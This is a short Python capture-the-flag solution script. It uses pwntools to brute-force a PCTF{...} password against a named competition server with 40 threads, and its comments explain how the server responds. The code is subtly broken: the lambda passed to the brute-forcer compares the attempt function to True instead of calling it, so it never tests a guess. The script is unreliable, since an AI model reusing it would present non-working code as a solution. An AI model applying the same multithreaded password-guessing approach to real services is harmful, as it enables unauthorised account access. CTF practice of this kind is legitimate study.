# Solution for CTF challenge with multi threading
# Interaction with server is like this:
# Server: What is the password: 
# Client: <password>
# Server: <password> is not long enough or <password> is too long
# Server: There's been an error (when password length is 19)

# Password is in the format: PCTF{<password>}
from pwn import *
import itertools
import string

# Loop to create a password of length 19
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
attempts = 0

def attempt(guess):
    guess = 'PCTF{' + ''.join(guess) + '}'
    conn = remote('chal.pctf.competitivecyber.club', 4757)
    conn.recvuntil('What is the password: ')
    conn.sendline(bytes(guess, encoding='utf-8'))
    response = conn.recvline()
    if response != b'There\'s been an error\n':
        print(response)
        return True
    conn.close()
    return False

if __name__ == '__main__':
    x = pwnlib.util.iters.mbruteforce(lambda x: attempt == True, chars, length=13, method='fixed', threads=40)
    print(x)